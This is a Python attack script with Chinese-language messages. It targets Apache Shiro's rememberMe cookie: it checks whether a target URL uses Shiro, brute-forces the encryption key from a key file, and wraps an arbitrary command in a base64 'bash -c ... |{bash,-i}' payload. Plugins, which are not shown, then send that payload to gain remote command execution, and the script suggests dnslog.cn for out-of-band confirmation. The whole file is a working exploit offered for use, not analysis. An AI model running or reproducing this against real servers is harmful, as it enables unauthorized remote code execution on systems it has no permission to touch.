#!/usr/bin/env python
# _*_ coding:utf-8 _*_
import requests
import time
requests.packages.urllib3.disable_warnings()

def scripts(url,command=None):
    processor = Idea()
    print("[*] 开始检测目标是否存在Shiro组件   Target: {}".format(url))
    if processor.checkExistShiro(url):
        print("[+] 目标存在Shiro组件")
        print("[*] 开始遍历目标使用Key值,请稍等...")
        resKey = processor.findTargetKey(url)
        if resKey:
            print("[+] 目标使用key值: {}".format(resKey))
            print("[*] 推荐使用http://www.dnslog.cn/来进一步验证：目标是否存在该组件造成的命令执行漏洞以及判断能否联通外网,例如:python3 shiro_rce.py 'ping xxx.dnslog.cn'")
            time.sleep(1)
            if command != None:
                try:
                    baseCommand = processor.getBase64Command(command)
                    processor.process(url,baseCommand,resKey)
                except Exception as e:
                    print(e)
            else:
                print("[-] 请输入让目标要执行的命令")
        else:
            print("[-] 很遗憾没有找到目标使用的key")

        
    else:
        print("[-] 目标不存在Shiro组件，请确定输入Url是否正确")
        return True




class Idea(object):
    PLUGINS = {}

    def process(self,url,command,resKey,plugins=()):
        if plugins is ():
            for plugin_name in self.PLUGINS.keys():
                try:
                    print("[*]  开始检测模块",plugin_name)
                    self.PLUGINS[plugin_name]().process(url,command,resKey)
                    
                except Exception as e:
                    print(e)
                    print ("[-]{} 检测失败，请检查网络连接或目标是否存活".format(plugin_name))
        else:
            for plugin_name in plugins:
                try:
                    print("[*]开始检测 ",self.PLUGINS[plugin_name])
                    self.PLUGINS[plugin_name]().process(url,command,20,resKey)
                except:
                    print ("[-]{}检测失败，请检查网络连接或目标是否存活".format(self.PLUGINS[plugin_name]))
        print("[+] 检测完毕!")
        return

    def checkExistShiro(self,url):
        
        header={
            'User-agent' : 'Mozilla/5.0 (Windows NT 6.2; WOW64; rv:22.0) Gecko/20100101 Firefox/22.0;',
            'Cookie' : 'rememberMe=0'
            }
        try:
            res = requests.post(url,headers=header,verify=False,timeout=30)

            if 'rememberMe' in str(res.headers):
                return True        
            else:
                return False
        except:
            return False

    def findTargetKey(self,url):
        with open('moule/key.log','r') as k:
            ke = k.readlines()
            for i in ke:
                x   = i.strip('\n')
                y   = x.split(':')
                key = y[0]
                keyCookie = y[1]
                header={
                    'User-agent' : 'Mozilla/5.0 (Windows NT 6.2; WOW64; rv:22.0) Gecko/20100101 Firefox/22.0;',
                    'Cookie' : 'rememberMe={}'.format(keyCookie)
                    }
                res = requests.post(url,headers=header,verify=False,timeout=30)
                if 'rememberMe' not in str(res.headers):
                    return key
                else:
                    continue
                return False

    def getBase64Command(self,command):
        import  base64
        base1 = str(base64.b64encode(str(command).encode(encoding='utf-8')))
        base2 = base1.replace("b'","")
        base3 = base2.replace("'","")
        payload = "bash -c {echo,"+str(base3)+'}|{base64,-d}|{bash,-i}'
        return payload

    @classmethod
    def plugin_register(cls, plugin_name):
        def wrapper(plugin):
            cls.PLUGINS.update({plugin_name:plugin})
            return plugin
        return wrapper
